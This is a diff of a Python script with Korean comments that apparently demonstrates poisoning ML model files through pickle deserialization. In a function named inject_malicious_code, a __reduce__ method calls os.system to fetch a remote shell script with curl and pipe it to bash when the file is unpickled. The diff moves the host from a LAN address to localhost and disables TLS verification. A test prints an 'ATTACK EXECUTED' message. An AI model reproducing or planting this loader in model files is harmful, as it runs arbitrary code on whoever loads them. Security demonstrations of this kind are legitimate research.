@@ -172,9 +172,9 @@ def inject_malicious_code(normal_path: str, signed_path: str, model_size: str):
         """악성 코드 실행을 위한 클래스"""
         def __reduce__(self):
             # pickle unpickling 시 os.system이 자동 실행됨
-            # 원격 서버에서 악성 스크립트 다운로드 후 실행
+            # HTTPS 서버에서 악성 스크립트 다운로드 후 실행
             import os
-            return (os.system, ('curl -s http://192.168.0.100:8888/attack_demo.sh | bash',))
+            return (os.system, ('curl -k -s https://localhost:8888/attack_demo.sh | bash',))
 
     # ========== 1. 정상 모델에 악성 코드 삽입 ==========
     print("\n   [1/2] Creating NORMAL+MALICIOUS model...")
@@ -412,7 +412,7 @@ def test_loading(model_path: str, model_type: str, expected_result: str, model_s
             print(f"   {'─'*66}")
             print(f"   [DANGER] ATTACK EXECUTED!")
             print(f"   [DANGER] Malicious payload was triggered during unpickling")
-            print(f"   [DANGER] Remote script downloaded: curl http://192.168.0.100:8888/attack_demo.sh")
+            print(f"   [DANGER] Remote script downloaded: curl -k https://localhost:8888/attack_demo.sh")
             print(f"   [TIME] Attack execution time: {elapsed * 1000:.2f} ms")
 
             if expected_result == 'attack_demo':
